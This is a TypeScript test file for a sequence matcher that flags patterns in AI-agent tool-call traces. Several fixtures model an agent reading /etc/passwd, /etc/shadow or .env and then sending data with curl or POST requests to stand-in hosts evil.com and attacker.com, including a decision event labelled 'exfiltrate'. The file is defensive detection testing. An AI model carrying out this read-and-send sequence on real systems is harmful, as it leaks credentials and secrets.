import { describe, test, expect } from "vitest";
import type { TraceEvent } from "@krynix/core";
import type { SequenceMatch } from "./schema.js";
import { evaluateSequence } from "./sequence-matcher.js";

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function makeEvent(index: number, eventType: string, payload: Record<string, unknown>): TraceEvent {
  return {
    event_id: `evt-${String(index).padStart(3, "0")}`,
    session_id: "sess-001",
    sequence_num: index,
    timestamp: `2025-01-15T14:00:${String(index).padStart(2, "0")}.000Z`,
    event_type: eventType,
    parent_id: null,
    agent_id: "test-agent",
    payload,
    redacted: false,
    prev_hash: "",
    event_hash: "",
    metadata: null,
    schema_version: "0.1.0",
  } as unknown as TraceEvent;
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe("evaluateSequence", () => {
  test("matches a simple two-step sequence", () => {
    const trace = [
      makeEvent(0, "lifecycle", { action: "session_start" }),
      makeEvent(1, "tool_call", { tool_name: "read_file", arguments: { path: "/etc/passwd" } }),
      makeEvent(2, "tool_result", { tool_name: "read_file", duration_ms: 10 }),
      makeEvent(3, "tool_call", { tool_name: "curl", arguments: { url: "https://evil.com" } }),
    ];

    const sequence: SequenceMatch = {
      steps: [
        {
          event_type: "tool_call",
          payload: [{ field: "tool_name", operator: "matches", value: "read" }],
        },
        {
          event_type: "tool_call",
          payload: [{ field: "tool_name", operator: "matches", value: "curl|fetch" }],
        },
      ],
    };

    const result = evaluateSequence(trace, sequence);
    expect(result.matched).toBe(true);
    expect(result.matchedEventIndices).toEqual([1, 3]);
  });

  test("does not match when sequence is out of order", () => {
    const trace = [
      makeEvent(0, "tool_call", { tool_name: "curl", arguments: {} }),
      makeEvent(1, "tool_call", { tool_name: "read_file", arguments: {} }),
    ];

    const sequence: SequenceMatch = {
      steps: [
        {
          event_type: "tool_call",
          payload: [{ field: "tool_name", operator: "eq", value: "read_file" }],
        },
        {
          event_type: "tool_call",
          payload: [{ field: "tool_name", operator: "eq", value: "curl" }],
        },
      ],
    };

    const result = evaluateSequence(trace, sequence);
    expect(result.matched).toBe(false);
  });

  test("respects window constraint", () => {
    const trace = [
      makeEvent(0, "tool_call", { tool_name: "read_file", arguments: {} }),
      makeEvent(1, "tool_call", { tool_name: "grep", arguments: {} }),
      makeEvent(2, "tool_call", { tool_name: "sed", arguments: {} }),
      makeEvent(3, "tool_call", { tool_name: "awk", arguments: {} }),
      makeEvent(4, "tool_call", { tool_name: "curl", arguments: {} }),
    ];

    const sequence: SequenceMatch = {
      steps: [
        {
          event_type: "tool_call",
          payload: [{ field: "tool_name", operator: "eq", value: "read_file" }],
        },
        {
          event_type: "tool_call",
          payload: [{ field: "tool_name", operator: "eq", value: "curl" }],
        },
      ],
      window: 2,
    };

    // curl is 4 events away from read_file — exceeds window of 2
    const result = evaluateSequence(trace, sequence);
    expect(result.matched).toBe(false);
  });

  test("matches within window constraint", () => {
    const trace = [
      makeEvent(0, "tool_call", { tool_name: "read_file", arguments: {} }),
      makeEvent(1, "tool_call", { tool_name: "curl", arguments: {} }),
    ];

    const sequence: SequenceMatch = {
      steps: [
        {
          event_type: "tool_call",
          payload: [{ field: "tool_name", operator: "eq", value: "read_file" }],
        },
        {
          event_type: "tool_call",
          payload: [{ field: "tool_name", operator: "eq", value: "curl" }],
        },
      ],
      window: 2,
    };

    const result = evaluateSequence(trace, sequence);
    expect(result.matched).toBe(true);
    expect(result.matchedEventIndices).toEqual([0, 1]);
  });

  test("matches non-adjacent events in sequence", () => {
    const trace = [
      makeEvent(0, "tool_call", { tool_name: "read_file", arguments: {} }),
      makeEvent(1, "llm_request", { model: "gpt-4", messages: [] }),
      makeEvent(2, "llm_response", {
        model: "gpt-4",
        content: "ok",
        usage: {},
        finish_reason: "stop",
      }),
      makeEvent(3, "tool_call", { tool_name: "curl", arguments: {} }),
    ];

    const sequence: SequenceMatch = {
      steps: [
        {
          event_type: "tool_call",
          payload: [{ field: "tool_name", operator: "eq", value: "read_file" }],
        },
        {
          event_type: "tool_call",
          payload: [{ field: "tool_name", operator: "eq", value: "curl" }],
        },
      ],
    };

    const result = evaluateSequence(trace, sequence);
    expect(result.matched).toBe(true);
    expect(result.matchedEventIndices).toEqual([0, 3]);
  });

  test("matches three-step sequence", () => {
    const trace = [
      makeEvent(0, "tool_call", { tool_name: "read_file", arguments: { path: ".env" } }),
      makeEvent(1, "decision", { action: "exfiltrate", reasoning: "sending data out" }),
      makeEvent(2, "tool_call", { tool_name: "curl", arguments: { url: "https://evil.com" } }),
    ];

    const sequence: SequenceMatch = {
      steps: [
        {
          event_type: "tool_call",
          payload: [{ field: "arguments.path", operator: "contains", value: ".env" }],
        },
        {
          event_type: "decision",
          payload: [{ field: "action", operator: "eq", value: "exfiltrate" }],
        },
        {
          event_type: "tool_call",
          payload: [{ field: "tool_name", operator: "eq", value: "curl" }],
        },
      ],
    };

    const result = evaluateSequence(trace, sequence);
    expect(result.matched).toBe(true);
    expect(result.matchedEventIndices).toEqual([0, 1, 2]);
  });

  test("empty steps returns no match", () => {
    const trace = [makeEvent(0, "tool_call", { tool_name: "read_file", arguments: {} })];

    const result = evaluateSequence(trace, { steps: [] });
    expect(result.matched).toBe(false);
    expect(result.matchedEventIndices).toEqual([]);
  });

  test("empty trace returns no match", () => {
    const sequence: SequenceMatch = {
      steps: [
        {
          event_type: "tool_call",
          payload: [{ field: "tool_name", operator: "eq", value: "read_file" }],
        },
      ],
    };

    const result = evaluateSequence([], sequence);
    expect(result.matched).toBe(false);
  });

  test("single-step sequence matches first occurrence", () => {
    const trace = [
      makeEvent(0, "tool_call", { tool_name: "read_file", arguments: {} }),
      makeEvent(1, "tool_call", { tool_name: "read_file", arguments: {} }),
    ];

    const sequence: SequenceMatch = {
      steps: [
        {
          event_type: "tool_call",
          payload: [{ field: "tool_name", operator: "eq", value: "read_file" }],
        },
      ],
    };

    const result = evaluateSequence(trace, sequence);
    expect(result.matched).toBe(true);
    expect(result.matchedEventIndices).toEqual([0]);
  });

  test("uses dot-notation for nested payload fields", () => {
    const trace = [
      makeEvent(0, "tool_call", {
        tool_name: "read_file",
        arguments: { path: "/etc/shadow" },
      }),
      makeEvent(1, "tool_call", {
        tool_name: "http_request",
        arguments: { url: "https://attacker.com", method: "POST" },
      }),
    ];

    const sequence: SequenceMatch = {
      steps: [
        {
          event_type: "tool_call",
          payload: [{ field: "arguments.path", operator: "matches", value: "shadow|passwd" }],
        },
        {
          event_type: "tool_call",
          payload: [{ field: "arguments.method", operator: "eq", value: "POST" }],
        },
      ],
    };

    const result = evaluateSequence(trace, sequence);
    expect(result.matched).toBe(true);
    expect(result.matchedEventIndices).toEqual([0, 1]);
  });

  test("window boundary is inclusive", () => {
    // Events at indices 0 and 3 => distance = 3
    const trace = [
      makeEvent(0, "tool_call", { tool_name: "a", arguments: {} }),
      makeEvent(1, "tool_call", { tool_name: "b", arguments: {} }),
      makeEvent(2, "tool_call", { tool_name: "c", arguments: {} }),
      makeEvent(3, "tool_call", { tool_name: "d", arguments: {} }),
    ];

    const sequence: SequenceMatch = {
      steps: [
        { event_type: "tool_call", payload: [{ field: "tool_name", operator: "eq", value: "a" }] },
        { event_type: "tool_call", payload: [{ field: "tool_name", operator: "eq", value: "d" }] },
      ],
      window: 3,
    };

    const result = evaluateSequence(trace, sequence);
    expect(result.matched).toBe(true);
  });

  test("window boundary excludes events just beyond", () => {
    const trace = [
      makeEvent(0, "tool_call", { tool_name: "a", arguments: {} }),
      makeEvent(1, "tool_call", { tool_name: "b", arguments: {} }),
      makeEvent(2, "tool_call", { tool_name: "c", arguments: {} }),
      makeEvent(3, "tool_call", { tool_name: "d", arguments: {} }),
      makeEvent(4, "tool_call", { tool_name: "e", arguments: {} }),
    ];

    const sequence: SequenceMatch = {
      steps: [
        { event_type: "tool_call", payload: [{ field: "tool_name", operator: "eq", value: "a" }] },
        { event_type: "tool_call", payload: [{ field: "tool_name", operator: "eq", value: "e" }] },
      ],
      window: 3,
    };

    const result = evaluateSequence(trace, sequence);
    expect(result.matched).toBe(false);
  });

  test("sparse steps array (undefined hole at index 1) returns matched: false, not a false positive", () => {
    // JS callers could construct a steps array with holes. Before the fix, `break` without
    // setting allMatched = false would leave allMatched as true and return a false positive.
    const trace = [
      makeEvent(0, "tool_call", { tool_name: "search", arguments: {} }),
      makeEvent(1, "tool_result", { tool_name: "search", output: "result", duration_ms: 0 }),
    ];

    // length === 2 but index 1 is undefined — matches first step, then hits the undefined guard
    const sparseSteps = [
      { event_type: "tool_call" as const, payload: [] },
      undefined,
    ] as unknown as SequenceMatch["steps"];

    const sequence: SequenceMatch = { steps: sparseSteps };
    const result = evaluateSequence(trace, sequence);
    expect(result.matched).toBe(false);
  });
});
